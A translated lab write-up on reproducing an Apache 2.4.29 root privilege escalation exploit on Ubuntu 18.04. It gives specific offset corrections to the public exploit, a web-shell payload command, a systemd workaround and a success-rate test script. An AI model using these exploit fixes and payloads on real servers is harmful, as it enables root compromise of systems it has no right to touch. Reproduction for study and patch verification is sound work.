In April, Apache root privilege escalation was revealed, and its exploitation
scripts was released on GitHub. This paper mainly discusses the problems when
recurring this vulnerability.
## The recurring environment
    # 系统, 跟系统关系不是很大，主要问题是能不能用包管理器安装对应版本的apache
    $ lsb_release -a
    Distributor ID: Ubuntu
    Description:    Ubuntu 18.04.1 LTS
    Release:    18.04

    # Apache版本，复现的关键就在该版本
    $ apache2 -v

  1. The specified version: `# apt install apache2=2.4.29-1ubuntu4 apache2-bin=2.4.29-1ubuntu4 apache2-utils=2.4.29-1ubuntu4 apache2-data=2.4.29-1ubuntu4`. 
  2. Use apt to install PHP directly. 
  3. The exp address: . 
  4. Open the "ssl" module: `a2enmod ssl`. 
The explanations of the need to open "ssl" module:
  1. Even if you don't open the "ssl" module, the vulnerability exists. 
  2. Even if you don't open the "ssl" module, you can modify the Apache configuration and open other ports. 
  3. If you only open port 80, you need to find another utilization chain. It is announced on GitHub that exp is invalid with only one port open. 
  4. The relevant code can be seen in [1](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433 "1") and [2](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L1223 "2"), as well as the macro definition of `SAFE_ACCPET`. 
    /* On some architectures it's safe to do unserialized accept()s in the single
     * Listen case.  But it's never safe to do it in the case where there's
     * multiple Listen statements.  Define SINGLE_LISTEN_UNSERIALIZED_ACCEPT
     * when it's safe in the single Listen case.
     */
    #ifdef SINGLE_LISTEN_UNSERIALIZED_ACCEPT
    #define SAFE_ACCEPT(stmt) (ap_listeners->next ? (stmt) : APR_SUCCESS)
    #else
    #define SAFE_ACCEPT(stmt) (stmt)
    #endif
Simply to say, the mutex is generated only when Apache opens multiple ports,
and the exp posted on GitHub is exploited by apex.
## Problems in recurring vulnerability
Having tried a lot of versions, no one can directly use the exp on GitHub. In
the above versions, two problems are found to cause the utilization failure:
  1. Calculation problem in `$all_buckets = $i - 0x10`. 
  2. Calculation problem in `$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);`.
In the first point, if you use GDB to debug the address that calculates the
`all_buckets`, you will find that the value is true. However, after executing
the `apache2ctl graceful` command, `all_buckets` generates a new value, but
only `0x38000` from the previous one, and this problem can be easily solved:
    $all_buckets = $i - 0x10 + 0x38000;
Change the second calculation directly as follows:
    $bucket_index = $bucket_index_middle;
## Problems when recurring vulnerability in Ubuntu:
My payload: `curl http://localhost/cfreal-carpediem.php?cmd=id>/tmp/2323232"`.
It seems that it was executed successfully, but the "2323232" file was not
found in the `/tmp` directory. The futher study suggests that `systemd`
redirected the `tmp` directory in Apache. Execute `$find /tmp -name "2323232"`
to find the file, but only the root user can access it. It’s very simple if
you don't want `systemd` to redirect the `tmp` directory. Set it false like
this: `PrivateTmp=false`. Restart it after change and test it again, you can
write the file under the `tmp` directory.
    $ cat /lib/systemd/system/apache2.service 
    [Unit]

    After=network.target remote-fs.target nss-lookup.target

    PrivateTmp=false
    Restart=on-abort
    [Install]
    WantedBy=multi-user.target
## About success rate
It’s said that it can’t be 100% successful in exp’s annotation, so I write a
script to test.
    root@vultr:~# cat check 
    #!/bin/bash
    SUCC=0
    COUNT=0
    for i in $(seq 1 20)
    do
    let COUNT+=1
    /etc/init.d/apache2 stop
    sleep 1
    /etc/init.d/apache2 start
    if [ -f "/tmp/1982347" ];then
        rm /tmp/1982347
    fi
    curl "http://localhost/cfreal-carpediem.php?cmd=id>/tmp/1982347"
    apache2ctl graceful
    sleep 1
    if [ -f "/tmp/1982347" ];then
        let SUCC+=1
    fi
    done
    echo "COUNT: $COUNT"
    echo "SUCCESS: $SUCC"
The results of testing for 20 times: no failures.
    # ./check
    ......
    COUNT: 20
    SUCCESS: 20
## Conclusion
Other versions have not been tested yet, but here are some suggestions.
  1. Check `all_buckets` address.
After the exp is executed, the corresponding `pid` and `all_buckets` addresses
will be output. You can use `gdb attach` to check whether the address is
correct: `p all_buckets`.
PS: Only when you install the dbg package, there is the `all_buckets` symbol:
`apt install apache2-dbg=2.4.29-1ubuntu4`.
If there is a problem, debug and check the process of searching for the
`all_buckets` address in exp. If there is no problem, use “gdb attach” main
process (the process with root privileges) to set a breakpoint at
`make_child`, and then execute `apache2ctl graceful`. When gdb's flow jumps to
the `make_child` function, output `p all_buckets` again. Compared with the
value obtained by exp, there is no problem if it is the same.
  2. Check `my_bucket` address. 
The previous process is the same as above, focusing on the code assigned by
`my_bucket` in the `make_child` function:
[3](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691
"3").
It should be noted that there is a fork above, so add `set follow-fork-mode
child` in gdb.  
The value of `my_bucket` points to the address of the heap. If the value of
`my_bucket` is no problem, exp is basically true. If not, adjust
`$bucket_index`.
